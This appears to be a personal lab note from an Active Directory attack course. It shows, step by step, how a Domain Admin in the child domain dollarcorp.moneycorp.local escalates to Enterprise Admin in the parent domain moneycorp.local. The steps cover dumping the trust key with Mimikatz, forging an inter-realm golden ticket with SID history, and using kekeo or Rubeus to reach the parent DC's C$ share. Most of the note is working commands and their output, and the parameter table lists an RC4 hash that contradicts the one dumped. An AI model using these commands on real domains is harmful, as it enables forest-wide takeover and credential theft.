# Privesc to Parent domain using TRUST KEY
Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.

![[Pasted image 20211010114758.png]]


1. Create session to domain controller (as Domain Admin)
```powershell
powershell -ep bypass

$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local

Enter-PSSession -Session $sess

# bypass AMSI

exit

Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess

Enter-PSSession -Session $sess

```

2. Dump Domain Controller Trust keys
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511) 
#..
# Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426) [ In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
#..
# * rc4_hmac_nt f052addf1d43f864a7d0c21cbce440c9
```

3. Create inter-realm TGT  ^aa6dea
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\temp\trust_tkt.kirbi"'

```


| Invoke-Mimikatz-Command | |
| -- | --|
| Kerberos::golden | The mimikatzmodule |
| /domain:dollarcorp.moneycorp.local | FQDN of the currentdomain |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the currentdomain |
| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of the enterprise admins group of the parent domain |
| /rc4:7ef5be456dc8d7450fb8f5f7348746c5 | RC4 of the trust key |
| /user:Administrator | User to impersonate |
| /service:krbtgt | Targetservice in the parent domain |
| /target:moneycorp.local | FQDN of the parent domain |
|  /ticket:C:\AD\Tools\kekeo\trust_tkt.kirbi | Path whereticket is to be saved |

4. Create a TGS for a service (CIFS) in the parent domain (moneycorp.local)
```powershell

# kekeo_old
.\asktgs.exe C:\AD\Tools\temp\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local

# * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
```

5. Present the TGS to the target service
```powershell
# kekeo_old
.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
# > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
```

6. Check if you can access the service
```powershell
ls \\mcorp-dc.moneycorp.local\c$

```

## Alternatively, using Rubeus
1. Request and inject a TGS using the same TGT as seen in this link [[#^aa6dea]]
```powershell
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt


#ServiceName : cifs/mcorp-dc.moneycorp.local 
#ServiceRealm : MONEYCORP.LOCAL 
#UserName : Administrator 
#UserRealm : dollarcorp.moneycorp.local

# check ticket
klist

# access the service
ls \\mcorp-dc.moneycorp.local\c$
```